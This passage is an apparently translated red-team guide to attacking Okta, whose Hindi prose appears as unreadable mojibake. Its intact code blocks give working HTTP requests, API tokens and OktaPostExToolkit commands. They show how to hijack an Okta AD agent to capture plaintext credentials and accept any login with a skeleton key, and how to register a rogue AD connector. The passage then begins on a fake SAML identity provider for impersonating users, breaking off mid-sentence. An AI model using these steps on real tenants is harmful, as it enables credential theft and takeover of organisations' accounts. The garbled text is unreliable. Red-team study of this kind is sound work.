рдпрд╣ рдХреЙрд▓ рддрдм рддрдХ рдмреНрд▓реЙрдХ рд░рд╣реЗрдЧреА рдЬрдм рддрдХ рдХреЛрдИ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ Okta рдореЗрдВ рдкреНрд░рдорд╛рдгрд┐рдд рдирд╣реАрдВ рд╣реЛ рдЬрд╛рддрд╛ (рдпрд╛ рдЕрдиреБрд░реЛрдз рдХрд╛ рд╕рдордп рд╕рдорд╛рдкреНрдд рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ), рдЬрд┐рд╕ рд╕реНрдерд┐рддрд┐ рдореЗрдВ рдпрд╣ рдЕрдЧрд▓рд╛ рдкреНрд░рджрд╛рди рдХрд┐рдпрд╛ рдЧрдпрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рд╕рд╛рдлрд╝ рдЯреЗрдХреНрд╕реНрдЯ рдореЗрдВ рд╡рд╛рдкрд╕ рдХрд░ рджреЗрдЧрд╛:
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<action>
<UserAuth actionId="rpc::app.active_directory.agent.reply.ok14-majorecs02a.auw2-ok14.internal//1670637714886//Y5PojoeQQ3KDgHHzA11P9wAAC8g:e9088489-99ff-435a-943b-b7dccc457cb5:">
<type>USER_AUTH</type>
<password>abc123</password>
<useLdapGroupPasswordPolicy>false</useLdapGroupPasswordPolicy>
<userName>domuser@lab.local</userName>
</UserAuth>
</action>
```
рдЬрдмрдХрд┐ рдпрд╣ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреИрдкреНрдЪрд░ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╣рдорд╛рд░реЗ рдкрд╛рд╕ рдЗрд╕ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░рдпрд╛рд╕ рдХрд╛ рдЙрддреНрддрд░ рджреЗрдиреЗ рдХрд╛ рднреА рдЕрд╡рд╕рд░ рд╣реЛрддрд╛ рд╣реИ, рдЕрдЧрд░ рд╣рдо рдХреБрдЫ рдРрд╕рд╛ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдЬреИрд╕реЗ рд╕реНрдХреЗрд▓реЗрдЯрди рдХреА рдкреНрд░рджрд╛рди рдХрд░рдирд╛ред рд╣рдо рдпрд╣ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд HTTP рдЕрдиреБрд░реЛрдз рдЬрд╛рд░реА рдХрд░рдХреЗ рдХрд░рддреЗ рд╣реИрдВ:
```xml
POST /api/1/internal/app/activedirectory/0oa7c027u2tcjxoki697/agent/a537ca54okqfsuu0s697/actionResult?responseid=12345 HTTP/1.1
Host: client.okta.com
Authorization: SSWS 00JFtjd...WgkeI1Eg5Y
Content-Type: application/xml; charset=utf-8
Content-Length: 1362

<agentActionResult xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" actionId="rpc::app.active_directory.agent.reply.ok14-majorecs04a.auw2-ok14.internal//1694301421033//ZPz86MzEBzhpMhSFWzyK5wAAA_Q:440a7d52-704b-4c1b-ac79-afdc241e3080:">
<type>USER_AUTH</type>
<status>SUCCESS</status>
<message></message>
<errorCode></errorCode>
<timestamps>
<actionRecieivedFromOkta>1694358076</actionRecieivedFromOkta>
<actionSentToLdapServer>1694358076</actionSentToLdapServer>
<responseReceivedFromLdapServer>1694358076</responseReceivedFromLdapServer>
<responseSentToOkta>1694358076</responseSentToOkta>
<actionReceivedFromOktaMilliseconds>20230910150116.726Z</actionReceivedFromOktaMilliseconds>
<actionSentToLdapServerMilliseconds>20230910150116.741Z</actionSentToLdapServerMilliseconds>
<responseReceivedFromLdapServerMilliseconds>20230910150116.741Z</responseReceivedFromLdapServerMilliseconds>
<responseSentToOktaMilliseconds>20230910150116.741Z</responseSentToOktaMilliseconds>
</timestamps>
<additionalInfo>{{"ExecutionTime":"12","AgentUpTime":"0 day(s) 22:41:49","DC":"DC01.lab.local","DomainControllerFunctionality":"WIN2016","DomainFunctionality":"WIN2016","ForestFunctionality":"WIN2016","LdapResponseTime":"0"}}</additionalInfo>
</agentActionResult>
```
рдЗрд╕ рдЕрдиреБрд░реЛрдз рдХреЛ рдЬрд╛рд░реА рдХрд░рдиреЗ рдХрд╛ рдкрд░рд┐рдгрд╛рдо рдХрд┐рд╕реА рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП Okta рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдирд╛ рд╣реИред

### AD рдХреЛ рдПрдХ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдХреЗ рд░реВрдк рдореЗрдВ рд╣рд╛рдИрдЬреИрдХ рдХрд░рдирд╛

(рдпрд╣ рд╣рдорд▓рд╛ [**рдпрд╣рд╛рдБ рд╕реЗ**](https://trustedsec.com/blog/okta-for-red-teamers) рдХреЙрдкреА рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ)ред

рд╣рдо рдЬрд╛рдирддреЗ рд╣реИрдВ рдХрд┐ рд╣рдо рдПрдХ рдЪреБрд░рд╛рдП рдЧрдП Agent Token рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ Okta AD Agent рдХреЛ рд╣рд╛рдИрдЬреИрдХ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рд▓реЗрдХрд┐рди рдЕрдЧрд░ рд╣рдордиреЗ рдПрдХ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд Okta рдЦрд╛рддреЗ рдХреЛ рд╕рдордЭреМрддрд╛ рдХрд┐рдпрд╛ рд╣реИ рдФрд░ рдмрд┐рдирд╛ рдореМрдЬреВрджрд╛ рдПрдЬреЗрдВрдЯ рдЯреЛрдХрди рдХреЗ рдРрд╕рд╛ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ рдХреНрдпрд╛ рд╣реЛрдЧрд╛? рдЪрд▓рд┐рдП рджреЗрдЦрддреЗ рд╣реИрдВ рдХрд┐ рдпрд╣ рдХреИрд╕реЗ рдХрд░рдирд╛ рд╣реИред

рд╕рдмрд╕реЗ рдкрд╣рд▓реЗ, рд╣рдореЗрдВ рдПрдХ Okta AD Agent API рдЯреЛрдХрди рдмрдирд╛рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░рд╡рд╛рд╣ рдХреЛ рд╢реБрд░реВ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рд╣рдореЗрдВ рдПрдХ OAuth Code рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред рдЗрд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣рдо рд╢реБрд░реБрдЖрдд рдХрд░рддреЗ рд╣реИрдВ:

{% code overflow="wrap" %}
```
https://example.okta.com/oauth2/authorize?redirect_uri=%2Foauth-response&response_type=code&client_id=cappT0Hfy97F1BoO1UTR&prompt=select_account
```
{% endcode %}

рдпрд╣ рдЖрдкрдХреЛ рдПрдХ рдЕрдиреБрдорддрд┐ рд╕рдВрдХреЗрдд рджреЗрдЧрд╛ рдЬрд┐рд╕реЗ рдЖрдкрдХреЛ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рдирд╛ рд╣реЛрдЧрд╛:

<figure><img src="../../.gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>

рдкреНрд░рд╕реНрддреБрдд рд╕рдВрдХреЗрдд рдХреЛ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рдиреЗ рд╕реЗ рдЖрдкрдХреЛ `/oauth-response` рдкрд░ рдПрдХ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рди рдорд┐рд▓реЗрдЧрд╛ рдЬрд┐рд╕рдореЗрдВ `code` рдкреИрд░рд╛рдореАрдЯрд░ рд╣реЛрдЧрд╛:

<figure><img src="../../.gitbook/assets/image (9) (1) (1).png" alt=""><figcaption></figcaption></figure>

рд╣рдореЗрдВ рдЗрд╕ `code` рдкреИрд░рд╛рдореАрдЯрд░ рдХреЛ рд▓реЗрдирд╛ рд╣реЛрдЧрд╛ рдФрд░ POST рдЕрдиреБрд░реЛрдз рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ API рдЯреЛрдХрди рдХреЗ рд▓рд┐рдП рдЕрдиреБрд░реЛрдз рдХрд░рдирд╛ рд╣реЛрдЧрд╛:
```
POST /oauth2/token HTTP/1.1
User-Agent: Okta AD Agent/3.16.0 (Microsoft Windows NT 6.2.9200.0; .NET CLR 4.0.30319.42000; 64-bit OS; 64-bit Process; sslpinning=disabled)
Content-Type: application/x-www-form-urlencoded
Host: example.okta.com
Content-Length: 65
Expect: 100-continue
Accept-Encoding: gzip, deflate
Connection: Keep-Alive

grant_type=api_token&code=7vzn01sl&client_id=cappT0Hfy97F1BoO1UTR
```
рдкреНрд░рддрд┐рд╕рд╛рдж рд╣рдореЗрдВ рд╣рдорд╛рд░рд╛ API рдЯреЛрдХрди рд╡рд╛рдкрд╕ рдХрд░рддрд╛ рд╣реИ:
```
{"api_token":"00456b2Lllk2KqjLBvaxANWEgTd7bqjsxjo8aZj0wd"}
```
рдЗрд╕ рдЯреЛрдХрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП, рд╣рдореЗрдВ рдЗрд╕реЗ рдПрдХ рд╕рдХреНрд░рд┐рдп AD рдбреЛрдореЗрди рдХреЗ рд╕рд╛рде рдЬреЛрдбрд╝рдирд╛ рд╣реЛрдЧрд╛ред рд╣рдо рдпрд╣ API рдХреЙрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрд░рддреЗ рд╣реИрдВ:
```
POST /api/1/internal/app/activedirectory/ HTTP/1.1
User-Agent: Okta AD Agent/3.16.0 (Microsoft Windows NT 6.2.9200.0; .NET CLR 4.0.30319.42000; 64-bit OS; 64-bit Process; sslpinning=disabled)
Host: example.okta.com
Accept: application/xml; charset=UTF-8
Content-Type: application/xml; charset=UTF-8
Content-Length: 86
Authorization: SSWS 00456b2Lllk2KqjLBvaxANWEgTd7bqjsxjo8aZj0wd

<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<domain name="lab.local" />
```
рдпрд╣ рд╣рдореЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд XML рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рд╡рд╛рдкрд╕ рджреЗрдЧрд╛, рдЬрд╣рд╛рдВ рд╣рдореЗрдВ рдмрд╛рдж рдореЗрдВ рдХреЗ рд▓рд┐рдП `id` рд╡рд┐рд╢реЗрд╖рддрд╛ рдореВрд▓реНрдп рдХреЛ рдмрдирд╛рдП рд░рдЦрдирд╛ рд╣реЛрдЧрд╛
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<activeDirectory id="0oa4jsza16ar1UdaW696">
<name>lab.local</name>
<newInstance>false</newInstance>
</activeDirectory>
```
рдЗрд╕рдХреЗ рдмрд╛рдж, рд╣рдо рдЕрдкрдиреЗ рдХрдиреЗрдХреНрдЯрд░ рдХрд╛ рдирд╛рдо рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ HTTP API рдХреЙрд▓ рдХрд░рддреЗ рд╣реИрдВ:
```
POST /api/1/internal/app/activedirectory/0oa4jsza16ar1UdaW196/agent?name=DC02 HTTP/1.1
Host: example.okta.com
Content-Type: text/xml
Content-Length: 0
Authorization: SSWS 00456b2Lllk2KqjLBvaxANWEgTd7bqjsxjo8aZj0wd
```
рдпрд╣ рдПрдХ XML рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рд╡рд╛рдкрд╕ рдХрд░реЗрдЧрд╛ рдЬрд╣рд╛рдБ рд╣рдореЗрдВ рдлрд┐рд░ рд╕реЗ `id` рд╡рд┐рд╢реЗрд╖рддрд╛ рдХреЛ рдмрдирд╛рдП рд░рдЦрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ:

{% code overflow="wrap" %}
```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?><agent id="a532camqiqXMhlOf5697"><name>DC02</name></agent>
```
```
рдЕрдВрдд рдореЗрдВ, рд╣рдо рдбреЗрдЯрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрдиреЗрдХреНрд╢рди рдХреЛ рдЖрд░рдВрдн рдХрд░рддреЗ рд╣реИрдВ:
```
```xml
POST /api/1/internal/app/activedirectory/0oa4jsza16ar1UdaW196/agent/a532camqiqXMhlOf5697/actionResult?agentVersion=3.13.0.0 HTTP/1.1
Host: example.okta.com
Content-Type: text/xml
Content-Length: 825
Authorization: SSWS 00456b2Lllk2KqjLBvaxANWEgTd7bqjsxjo8aZj0wd

<agentActionResult xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
<type>INIT</type>
<status>SUCCESS</status>
<timestamps>
<actionRecieivedFromOkta />
<actionSentToLdapServer />
<responseReceivedFromLdapServer />
<responseSentToOkta>1694304008</responseSentToOkta>
<actionReceivedFromOktaMilliseconds>00010101000000.000Z</actionReceivedFromOktaMilliseconds>
<actionSentToLdapServerMilliseconds>00010101000000.000Z</actionSentToLdapServerMilliseconds>
<responseReceivedFromLdapServerMilliseconds>00010101000000.000Z</responseReceivedFromLdapServerMilliseconds>
<responseSentToOktaMilliseconds>20230910000008.174Z</responseSentToOktaMilliseconds>
</timestamps>
<additionalInfo>{}</additionalInfo>
</agentActionResult>
```
рдЗрд╕реЗ рдкреВрд░рд╛ рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж, рд╣рдорд╛рд░рд╛ рдирдХрд▓реА AD рдПрдЬреЗрдВрдЯ рдЕрдм рддреИрдпрд╛рд░ рд╣реИ, рдФрд░ рдкрд╣рд▓реЗ рджрд┐рдЦрд╛рдП рдЧрдП рдЕрдиреБрд╕рд╛рд░ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░рдпрд╛рд╕реЛрдВ рдХреЛ рд╕рдВрд╕рд╛рдзрд┐рдд рдХрд░реЗрдЧрд╛ред

рдЕрдм рд╕реНрдкрд╖реНрдЯ рд░реВрдк рд╕реЗ рд╣рдо рдпрд╣ рд╕рдм Burp рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдирд╣реАрдВ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рдХреБрдЫ рдЙрдкрдпреЛрдЧ-рдорд╛рдорд▓реЛрдВ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЙрдкрдХрд░рдг рдмрдирд╛рдпрд╛ рдЧрдпрд╛ рд╣реИред рдпрд╣ [рдпрд╣рд╛рдБ](https://github.com/xpn/OktaPostExToolkit) рд╕реЗ рдЙрдкрд▓рдмреНрдз рд╣реИред

рд╣рдо рдЬрд┐рд╕ рдкрд╣рд▓реЗ рдореЛрдб рдореЗрдВ рдЗрд╕ рдЙрдкрдХрд░рдг рдХреЛ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ рд╡рд╣ `token` рдореЛрдб рд╣реИ, рдЬреЛ рдПрдХ рд╕рдордЭреМрддрд╛ рдХрд┐рдП рдЧрдП Agent Token рдорд╛рди рдХреЛ рд▓реЗрддрд╛ рд╣реИ рдФрд░ Okta API рд╕реЗ рдЬреБрдбрд╝реЗрдЧрд╛, рдЬреЛ рднреА рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдкреНрд░рд╛рдкреНрдд рд╣реЛрддреЗ рд╣реИрдВ рдЙрдиреНрд╣реЗрдВ рдбрдВрдк рдХрд░реЗрдЧрд╛:

{% code overflow="wrap" %}
```bash
python ./main.py --tenant-domain example.okta.com --skeleton-key WibbleWobble99 token --api-token 00456b2Lllk2KqjLBvaxANWEgTd7bqjsxjo8aZj0wd --app-id 0oa7c027u2TcJxoki697 --agent-id a537cnm9ldwPILkqP697
```
рд╡реАрдбрд┐рдпреЛ рдЙрджрд╛рд╣рд░рдг:

* [https://www.youtube.com/watch?v=ZYRcfj6jtaA](https://www.youtube.com/watch?v=ZYRcfj6jtaA)
* [https://youtu.be/Sob2u6xEjTE](https://youtu.be/Sob2u6xEjTE)

рдпрд╣ рдЯреВрд▓ рдПрдХ рдирдпрд╛ AD рдХрдиреЗрдХреНрдЯрд░ рд░рдЬрд┐рд╕реНрдЯрд░ рдХрд░рдиреЗ рдХреА рднреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдЕрдЧрд░ рд╣рдорд╛рд░реЗ рдкрд╛рд╕ рдПрдХ Okta рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рдкреНрд░рд╢рд╛рд╕рдирд┐рдХ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдЙрдкрд▓рдмреНрдз рд╣реЛрдВ рдЬреЛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣рд╛ рд╣реИ:

{% code overflow="wrap" %}
```bash
python ./main.py --tenant-domain example.okta.com --skeleton-key WibbleWobble99 oauth --machine-name DC01 --windows-domain lab.local --code OAUTH_CODE_HERE
```
{% endcode %}

### Okta рдирдХрд▓реА SAML рдкреНрд░рджрд╛рддрд╛

(рд╣рдорд▓реЗ рдХреА рдирдХрд▓ [**рдпрд╣рд╛рдБ рд╕реЗ**](https://trustedsec.com/blog/okta-for-red-teamers)).

рдПрдХ рдФрд░ рддрдХрдиреАрдХ рдЬреЛ рдореВрд▓реНрдпрд╛рдВрдХрди рдХреЗ рджреМрд░рд╛рди рдмрд╣реБрдд рдЙрдкрдпреЛрдЧреА рд░рд╣реА рд╣реИ, рд╡рд╣ рд╣реИ рдирдХрд▓реА SAML рдкреНрд░рджрд╛рддрд╛ рдХреА рддреИрдирд╛рддреАред

рд╣рд╛рд▓ рд╣реА рдореЗрдВ Okta рдиреЗ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рд╣рдорд▓реЛрдВ рдкрд░ рдПрдХ рд╕реБрд░рдХреНрд╖рд╛ рдЕрдкрдбреЗрдЯ рдкреНрд░рджрд╛рди рдХрд┐рдпрд╛ рд╣реИ рдЬреЛ рдЗрд╕ рддрдХрдиреАрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рдпрд╣ рдЬрд╛рдирдирд╛ рдирд┐рд╢реНрдЪрд┐рдд рд░реВрдк рд╕реЗ рдЙрдкрдпреЛрдЧреА рд╣реИ рдЬрдм рдЖрдк рдХрд┐рд╕реА рдкрд░реНрдпрд╛рд╡рд░рдг рдкрд░ рдЧрддрд┐рд╡рд┐рдзрд┐ рдХрд╛ рдЕрдиреБрдХрд░рдг рдХрд░ рд░рд╣реЗ рд╣реЛрддреЗ рд╣реИрдВ, рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдЙрди рдЧреНрд░рд╛рд╣рдХреЛрдВ рдХреЗ рд▓рд┐рдП рдЬреЛ рдЗрд╕ рд╡рд┐рд╢реЗрд╖ рд╣рдорд▓реЗ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХрд╛ рдкрд░реАрдХреНрд╖рдг рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВред

рдпрджрд┐ рд╣рдорд╛рд░реЗ рдкрд╛рд╕ рдПрдХ рдЙрдЪреНрдЪ рд╕реНрддрд░реАрдп Okta рдЦрд╛рддреЗ рддрдХ рдкрд╣реБрдБрдЪ рд╣реИ, рддреЛ рд╣рдо Okta рдХреА рдХрд╛рд░реНрдпрдХреНрд╖рдорддрд╛ рдХреЗ рдПрдХ рд╣рд┐рд╕реНрд╕реЗ рдХреЗ рд░реВрдк рдореЗрдВ рдПрдХ рдмрд╛рд╣рд░реА Identity Provider рдХреЛ рддреИрдирд╛рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдпрд╣ рдмрд╛рд╣рд░реА рдкреНрд░рджрд╛рддрд╛рдУрдВ рдЬреИрд╕реЗ рдХрд┐ Entra ID рдХреЛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреВрд░рд╛ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдЗрд╕рд╕реЗ рдкрд╣рд▓реЗ рдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ Okta рдкрд░ рдкреБрдирдГ рдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдП рддрд╛рдХрд┐ рд╡рд╣ рдПрдХреАрдХреГрдд рдРрдкреНрд╕ рдХрд╛ рдЪрдпрди рдХрд░ рд╕рдХреЗред

рд▓реЗрдХрд┐рди рдЕрдЧрд░ рд╣рдо IDP рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рддреЗ рд╣реИрдВ? рддреЛ рдпрд╣ рд╕рдордЭ рдореЗрдВ рдЖрддрд╛ рд╣реИ рдХрд┐ рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ, рд╣рдо рдХрд┐рд╕реА рднреА рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдЕрдиреБрд░реЛрдз рдХреЛ рдордВрдЬреВрд░реА рджреЗ рд╕рдХрддреЗ рд╣реИрдВред

рдЗрд╕рдХрд╛ рдкрд░реАрдХреНрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рд╣рдореЗрдВ рдПрдХ рдХрд╕реНрдЯрдо Identity Provider рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ рдЬрд┐рд╕реЗ рддреИрдирд╛рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред рдПрдХ рдмрд╣реБрдд рд╣реА рдЕрд╕реНрдерд┐рд░ SAML IDP рдЬреЛ рд╣рдорд╛рд░реА рджреБрд╖реНрдЯ рдЧрддрд┐рд╡рд┐рдзрд┐рдпреЛрдВ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИ, [рдпрд╣рд╛рдБ](https://github.com/xpn/OktaPostExToolkit) рдкрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕ рдЙрдкрдХрд░рдг рдХреЗ рдкреАрдЫреЗ рдореВрд▓ рд╡рд┐рдЪрд╛рд░ рдпрд╣ рд╣реИ рдХрд┐ рд╣рдореЗрдВ рд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд SAML рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдПрдБ рдЬрд╛рд░реА рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдЬреЛ рдХрд┐рд╕реА рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдЕрдиреБрд░реВрдк рд╣реЛ рд╕рдХрддреА рд╣реИрдВред

рдпрд╣ рд╕рд░реНрд╡рд░ `/saml` рдкрд░ рдЖрдиреЗ рд╡рд╛рд▓реЗ HTTP рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЗ рд▓рд┐рдП рд╕реБрдиреЗрдЧрд╛, рдЗрд╕рд▓рд┐рдП рд╣рдореЗрдВ рдкрд╣рд▓реЗ Okta рдореЗрдВ рдПрдХ IDP рддреИрдирд╛рдд рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред

рд╕рдмрд╕реЗ рдкрд╣рд▓реЗ, рд╣рдо SAML 2.0 IDP рдХрд╛ рдЪрдпрди рдХрд░рддреЗ рд╣реИрдВ:

<figure><img src="../../.gitbook/assets/image (10) (1) (1).png" alt=""><figcaption></figcaption></figure>

IDP рдХреЛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рддреЗ рд╕рдордп, рд╣рдореЗрдВ рдХреБрдЫ рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдкрд░ рдзреНрдпрд╛рди рджреЗрдирд╛ рд╣реЛрдЧрд╛ред рдкрд╣рд▓рд╛ рд╣реИ `Name`, рдЬреЛ Okta рдХреЗ рдЕрдиреНрдп рдкреНрд░рд╢рд╛рд╕рдХреЛрдВ рдХреЛ рджрд┐рдЦрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдорд┐рддреНрд░рд╡рдд рдирд╛рдо рд╣реИред

рдЕрдЧрд▓рд╛ рд╣реИ рдЬрд╛рд░реАрдХрд░реНрддрд╛ URL, рдЬрд┐рд╕реЗ URI рдкреНрд░рд╛рд░реВрдк рдореЗрдВ рдПрдХ рдкрд╣рдЪрд╛рдирдХрд░реНрддрд╛ рдХреЗ рдореВрд▓реНрдп рдХреЗ рд░реВрдк рдореЗрдВ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред рдпрд╣ рдлрд┐рд░ рд╕реЗ рдХреБрдЫ рднреА рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рд╣рдо `https://www.example.com/` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВрдЧреЗред

<figure><img src="../../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>

рд╣рдореЗрдВ `IdP Single Sign-On URL` рдХреНрд╖реЗрддреНрд░ рдХреЛ рднреА рд╕реЗрдЯ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ рдЬрд╣рд╛рдБ рд╣рдорд╛рд░рд╛ SAML рд╕рд░реНрд╡рд░ рдЪрд▓ рд░рд╣рд╛ рд╣реИред рдЕрдм, рдЕрдЪреНрдЫреА рдмрд╛рдд рдпрд╣ рд╣реИ рдХрд┐ рдЗрд╕реЗ рд╣рдорд╛рд░реЗ рд╕рд░реНрд╡рд░ рдХреА рдУрд░ рдЗрд╢рд╛рд░рд╛ рдХрд░рдиреЗ рд╡рд╛рд▓рд╛ URL рд╣реЛрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИред рдореБрдЭреЗ рд▓рдЧрддрд╛ рд╣реИ рдХрд┐ рдЗрд╕реЗ рдмрддрд╛рдирд╛ рд▓рд╛рдпрдХ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рд╣рдо рдпрд╣рд╛рдБ рдЗрдирдкреБрдЯ рдХрд┐рдП рдЧрдП URL рдореЗрдВ рдХрд╛рдлреА рд░рдЪрдирд╛рддреНрдордХ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдиреАрд▓реА рдЯреАрдо рдХрд╛ рдХрд╛рдо рдереЛрдбрд╝рд╛ рдХрдард┐рди рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рд╣рдо рдЗрд╕ рдХреНрд╖реЗрддреНрд░ рдХреЛ `https://idp.google.com/saml` рдЬреИрд╕реЗ рдХреБрдЫ рдкрд░ рд╕реЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЕрдЧрд░ рд╣рдо рдЪрд╛рд╣реЗрдВ, рдФрд░ рд╣рдореЗрдВ рдХреЗрд╡рд▓ рдЗрддрдирд╛ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ рдХрд┐ рд╣рдо рдЗрдирдмрд╛рдЙрдВрдб SAML рдЕрдиреБрд░реЛрдз рдХреЛ рдкрдХрдбрд╝ рд╕рдХреЗрдВред рдпрд╣рд╛рдБ рдЕрдЪреНрдЫреА рдмрд╛рдд рдпрд╣ рд╣реИ: SAML рдЕрдиреБрд░реЛрдз рдХреНрд▓рд╛рдЗрдВрдЯ-рд╕рд╛рдЗрдб рдЕрдЧреНрд░реЗрд╖рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ Okta SAML `AuthRequest` рдЙрддреНрдкрдиреНрди рдХрд░реЗрдЧрд╛ рдФрд░ рд╣рдорд╛рд░реЗ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЛ SAML рдЕрдиреБрд░реЛрдз рдХреЗ рд╕рд╛рде `https://idp.google.com/` рдкрд░ рдкреБрдирдГ рдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░реЗрдЧрд╛ред рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рд╣рдо рд╕реНрдерд╛рдиреАрдп 